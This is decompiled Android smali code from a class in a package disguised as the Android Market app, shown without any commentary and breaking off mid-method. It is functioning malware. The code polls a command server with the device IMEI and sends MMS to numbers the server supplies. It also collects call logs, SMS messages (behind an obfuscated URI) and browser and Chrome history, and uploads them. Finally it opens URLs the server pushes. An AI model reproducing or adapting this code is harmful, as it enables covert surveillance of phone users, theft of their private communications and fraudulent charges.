.class final Lcom/android/market/m;
.super Landroid/os/AsyncTask;


# instance fields
.field private final a:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    iput-object p1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    return-void
.end method

.method private a(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    const-string v1, ""

    const-string v0, ""

    :try_start_0
    new-instance v2, Ljava/net/URI;

    const-string v3, "\\"

    const-string v4, ""

    invoke-virtual {p1, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/net/URI;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URI;->getHost()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_0

    const-string v1, ""

    :goto_0
    invoke-virtual {v2}, Ljava/net/URI;->getPath()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    const-string v0, ""
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0

    :cond_0
    :try_start_1
    invoke-virtual {v2}, Ljava/net/URI;->getHost()Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :cond_1
    invoke-virtual {v2}, Ljava/net/URI;->getPath()Ljava/lang/String;
    :try_end_1
    .catch Ljava/net/URISyntaxException; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v0

    goto :goto_1

    :catch_0
    move-exception v2

    goto :goto_1
.end method

.method private a()Ljava/lang/StringBuilder;
    .locals 9

    const/4 v2, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v0, "["

    invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "content://ABC"

    const-string v1, "A"

    const-string v3, "s"

    invoke-virtual {v0, v1, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "B"

    const-string v3, "m"

    invoke-virtual {v0, v1, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "C"

    const-string v3, "s"

    invoke-virtual {v0, v1, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    const-string v1, ""

    const-string v1, ""

    const-string v1, ""

    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    if-lez v1, :cond_0

    :goto_0
    invoke-interface {v0}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v1

    if-eqz v1, :cond_1

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_0
    const-string v0, "]"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    return-object v0

    :cond_1
    const-string v1, "address"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "body"

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v3, "date"

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Ljava/util/Locale;->US:Ljava/util/Locale;

    const-string v5, "{\"address\":%s,\"body\":%s,\"date\":%s}"

    const/4 v7, 0x3

    new-array v7, v7, [Ljava/lang/Object;

    const/4 v8, 0x0

    invoke-static {v1}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v7, v8

    const/4 v1, 0x1

    invoke-static {v2}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v7, v1

    const/4 v1, 0x2

    invoke-static {v3}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v7, v1

    invoke-static {v4, v5, v7}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v0}, Landroid/database/Cursor;->isLast()Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ","

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_2
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    goto :goto_0
.end method

.method private a(Landroid/net/Uri;)Ljava/lang/StringBuilder;
    .locals 12

    const/4 v4, 0x0

    const/4 v11, 0x3

    const/4 v10, 0x2

    const/4 v9, 0x1

    const/4 v8, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v0, "["

    invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v11, [Ljava/lang/String;

    const-string v0, "title"

    aput-object v0, v2, v8

    const-string v0, "url"

    aput-object v0, v2, v9

    const-string v0, "date"

    aput-object v0, v2, v10

    const-string v0, "bookmark = 0"

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v3, "bookmark = 0"

    move-object v1, p1

    move-object v5, v4

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    const-string v1, ""

    const-string v1, ""

    const-string v1, ""

    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    if-lez v1, :cond_0

    :goto_0
    invoke-interface {v0}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v1

    if-eqz v1, :cond_1

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_0
    const-string v0, "]"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    return-object v0

    :cond_1
    const-string v1, "title"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "url"

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v3, "date"

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Ljava/util/Locale;->US:Ljava/util/Locale;

    const-string v5, "{\"title\":%s,\"url\":%s,\"date\":%s}"

    new-array v7, v11, [Ljava/lang/Object;

    invoke-static {v1}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v7, v8

    invoke-static {v2}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v7, v9

    invoke-static {v3}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v7, v10

    invoke-static {v4, v5, v7}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v0}, Landroid/database/Cursor;->isLast()Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ","

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_2
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    goto :goto_0
.end method

.method private b()Ljava/lang/StringBuilder;
    .locals 15

    const/4 v2, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v0, "["

    invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_0

    const-string v0, "number"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    const-string v0, "type"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    const-string v0, "date"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    const-string v0, "duration"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    :cond_0
    const-string v0, "]"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    return-object v0

    :cond_1
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    packed-switch v0, :pswitch_data_0

    move-object v0, v2

    :goto_1
    sget-object v11, Ljava/util/Locale;->US:Ljava/util/Locale;

    const-string v12, "{\"number\":%s,\"date\":%s,\"duration\":%s,\"type\":%s}"

    const/4 v13, 0x4

    new-array v13, v13, [Ljava/lang/Object;

    const/4 v14, 0x0

    invoke-static {v8}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    aput-object v8, v13, v14

    const/4 v8, 0x1

    invoke-static {v9}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    aput-object v9, v13, v8

    const/4 v8, 0x2

    invoke-static {v10}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    aput-object v9, v13, v8

    const/4 v8, 0x3

    invoke-static {v0}, Lorg/json/JSONObject;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v13, v8

    invoke-static {v11, v12, v13}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v1}, Landroid/database/Cursor;->isLast()Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, ","

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_2
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    goto :goto_0

    :pswitch_0
    const-string v0, "OUTGOING"

    goto :goto_1

    :pswitch_1
    const-string v0, "INCOMING"

    goto :goto_1

    :pswitch_2
    const-string v0, "MISSED"

    goto :goto_1

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_1
        :pswitch_0
        :pswitch_2
    .end packed-switch
.end method


# virtual methods
.method protected varargs a([Ljava/lang/String;)Ljava/lang/String;
    .locals 12

    const/4 v11, 0x0

    const/4 v4, 0x2

    const/4 v1, 0x1

    const/4 v2, 0x0

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/android/market/v;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3, v4}, Ljava/util/ArrayList;-><init>(I)V

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "action"

    const-string v6, "poll"

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "imei"

    invoke-direct {v4, v5, v0}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-static {v0, v3}, Lcom/android/market/NetworkController;->a(Landroid/content/Context;Ljava/util/List;)Ljava/lang/CharSequence;

    move-result-object v0

    const-string v3, ""

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    :cond_0
    :goto_0
    return-object v11

    :cond_1
    const-string v3, "401"

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    new-instance v0, Lcom/android/market/n;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/android/market/n;-><init>(Landroid/content/Context;)V

    new-array v1, v2, [Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/android/market/n;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_0

    :cond_2
    :try_start_0
    new-instance v8, Lorg/json/JSONObject;

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v8, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2b

    const-string v0, "number_1"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    const-string v0, "prefix_1"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    :try_start_1
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const-string v0, "number_1"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "p"

    const-string v5, "+"

    invoke-virtual {v0, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "P"

    const-string v5, "+"

    invoke-virtual {v0, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v4

    const/4 v5, 0x4

    if-ne v4, v5, :cond_3

    const/16 v4, 0x11

    if-lt v3, v4, :cond_3

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "+"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_3
    const-string v3, "prefix_1"

    invoke-virtual {v8, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4}, Landroid/content/Intent;-><init>()V

    const-string v5, "android.send.mms"

    invoke-virtual {v4, v5}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "a"

    invoke-virtual {v4, v5, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, "b"

    invoke-virtual {v4, v0, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-virtual {v0, v4}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    new-instance v3, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v4, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    const/4 v5, 0x1

    const-string v0, "ok"

    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_29

    :cond_4
    :goto_1
    const-string v0, "call_log"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5

    :try_start_3
    const-string v0, "call_log"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_24

    const-string v3, ""

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_24

    new-instance v0, Lcom/android/market/p;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v4, "call_log"

    invoke-direct {v0, v3, v4}, Lcom/android/market/p;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    invoke-direct {p0}, Lcom/android/market/m;->b()Ljava/lang/StringBuilder;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v0, v3}, Lcom/android/market/p;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    move v0, v1

    :goto_2
    :try_start_4
    new-instance v3, Lcom/android/market/o;

    iget-object v4, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v4}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v4, 0x2

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "id"

    invoke-virtual {v8, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x1

    if-eqz v0, :cond_f

    const-string v0, "ok"

    :goto_3
    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_27

    :cond_5
    :goto_4
    const-string v0, "sms_history"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_6

    :try_start_5
    const-string v0, "sms_history"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_23

    const-string v3, ""

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_23

    new-instance v0, Lcom/android/market/p;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v4, "sms_history"

    invoke-direct {v0, v3, v4}, Lcom/android/market/p;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    invoke-direct {p0}, Lcom/android/market/m;->a()Ljava/lang/StringBuilder;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v0, v3}, Lcom/android/market/p;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    move v0, v1

    :goto_5
    :try_start_6
    new-instance v3, Lcom/android/market/o;

    iget-object v4, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v4}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v4, 0x2

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "id"

    invoke-virtual {v8, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x1

    if-eqz v0, :cond_10

    const-string v0, "ok"

    :goto_6
    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_25

    :cond_6
    :goto_7
    const-string v0, "browser_history"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    :try_start_7
    const-string v0, "browser_history"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_22

    const-string v3, ""

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_22

    new-instance v0, Lcom/android/market/p;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v4, "history"

    invoke-direct {v0, v3, v4}, Lcom/android/market/p;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    sget-object v5, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    invoke-direct {p0, v5}, Lcom/android/market/m;->a(Landroid/net/Uri;)Ljava/lang/StringBuilder;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v0, v3}, Lcom/android/market/p;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_7
    .catch Lorg/json/JSONException; {:try_start_7 .. :try_end_7} :catch_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    :try_start_8
    new-instance v0, Lcom/android/market/p;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v4, "history"

    invoke-direct {v0, v3, v4}, Lcom/android/market/p;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-string v5, "content://com.android.chrome.browser/bookmarks"

    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    invoke-direct {p0, v5}, Lcom/android/market/m;->a(Landroid/net/Uri;)Ljava/lang/StringBuilder;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v0, v3}, Lcom/android/market/p;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_8
    .catch Lorg/json/JSONException; {:try_start_8 .. :try_end_8} :catch_24
    .catchall {:try_start_8 .. :try_end_8} :catchall_c

    move v0, v1

    :goto_8
    :try_start_9
    new-instance v3, Lcom/android/market/o;

    iget-object v4, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v4}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v4, 0x2

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "id"

    invoke-virtual {v8, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x1

    if-eqz v0, :cond_13

    const-string v0, "ok"

    :goto_9
    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_22

    :cond_7
    :goto_a
    const-string v0, "url"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_9

    :try_start_a
    const-string v0, "url"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_14

    const-string v0, ""

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_a
    .catch Lorg/json/JSONException; {:try_start_a .. :try_end_a} :catch_9
    .catchall {:try_start_a .. :try_end_a} :catchall_4

    move-result v0

    if-nez v0, :cond_14

    move v0, v1

    :goto_b
    if-eqz v0, :cond_8

    :try_start_b
    new-instance v1, Landroid/content/Intent;

    const-string v4, "android.intent.action.VIEW"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-direct {v1, v4, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-virtual {v3, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_b
    .catch Lorg/json/JSONException; {:try_start_b .. :try_end_b} :catch_21
    .catchall {:try_start_b .. :try_end_b} :catchall_b

    :cond_8
    :try_start_c
    new-instance v1, Lcom/android/market/o;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v3}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

